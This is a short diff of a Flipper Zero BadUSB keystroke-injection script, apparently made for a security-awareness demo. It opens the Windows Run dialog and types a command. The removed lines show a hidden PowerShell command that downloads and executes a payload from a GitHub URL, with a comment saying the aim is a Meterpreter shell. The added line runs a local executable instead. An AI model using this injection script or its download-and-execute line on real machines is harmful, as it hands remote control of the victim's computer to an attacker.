@@ -1,9 +1,5 @@
-REM This is a demo script to obtain a meterepreter shell using Flipper Zero BADUSB feature
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -w hidden -noni -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/polo-le-rigolo/payloads/demo_sensibilisation.exe')"
+STRING C:\Users\unvoy\Downloads\demo_sensibilisation.exe
 ENTER
-
-
-
